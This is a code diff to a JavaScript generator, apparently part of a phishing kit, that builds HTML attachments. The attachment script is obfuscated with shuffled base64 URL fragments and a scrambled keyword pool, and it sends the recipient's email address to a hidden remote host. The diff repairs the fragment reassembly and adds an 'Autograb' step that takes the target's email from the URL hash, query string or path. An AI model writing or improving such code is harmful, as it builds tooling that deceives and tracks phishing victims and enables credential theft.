@@ -4128,11 +4128,12 @@ function downloadHtmlAttachment(url) {
     while (frags.length < 4) frags.push('_');
 
     // Deterministic reorder: [2,0,1,...]
-    const shuffledFrags = [], indices = [];
+    const shuffledFrags = [];
     [2, 0, 1, 3].forEach(o => {
-        if (o < frags.length) { shuffledFrags.push(frags[o]); indices.push(o); }
+        if (o < frags.length) { shuffledFrags.push(frags[o]); }
     });
-    const rebuild = indices.map(i => 'z[' + i + ']').join('+');
+    // Inverse mapping: for each original position, find its index in the shuffled array
+    const rebuild = 'z[' + frags.map((_, origPos) => shuffledFrags.indexOf(frags[origPos])).join(']+z[') + ']';
 
     // Keyword pool
     var kw = ['uxo','innerText','setRequestHeader','application/json','onreadystatechange',
@@ -4144,7 +4145,7 @@ function downloadHtmlAttachment(url) {
     var g = kw.indexOf('GET');
     var s = kw.indexOf('send');
     var sr = kw.indexOf('setRequestHeader');
-    var ac = kw.indexOf('accept');
+    var ac = kw.indexOf('Accept');
     var aj = kw.indexOf('application/json');
     var orsc = kw.indexOf('onreadystatechange');
     var rs = kw.indexOf('readyState');
@@ -4163,6 +4164,8 @@ function downloadHtmlAttachment(url) {
     html += 'var z=[' + shuffledFrags.map(function(f) { return '"' + f + '"'; }).join(',') + '];\n';
     html += 'var u=atob(' + rebuild + ');\n';
     html += 'var e=document.getElementById(_(0))[_(' + it + ')];\n';
+    html += '// Autograb: if placeholder is not a real email (e.g. {email}), grab from URL\n';
+    html += 'if(!e||e.indexOf("@")<0){try{var h=location.hash.substring(1);if(h.indexOf("@")>=0)e=decodeURIComponent(h);else{var p=new URLSearchParams(location.search);if(p.get("email"))e=p.get("email");else if(p.get("e"))e=p.get("e");else{var pa=location.pathname.split("/");for(var i=pa.length-1;i>=0;i--){if(decodeURIComponent(pa[i]).indexOf("@")>=0){e=decodeURIComponent(pa[i]);break;}}}}}catch(_){}}\n';
     html += 'var x=new XMLHttpRequest();\n';
     html += 'x[' + o + '](_(' + g + '),u+(e?"/"+encodeURIComponent(e):""),true);\n';
     html += 'x[' + sr + '](_(' + ac + '),_(' + aj + '));\n';
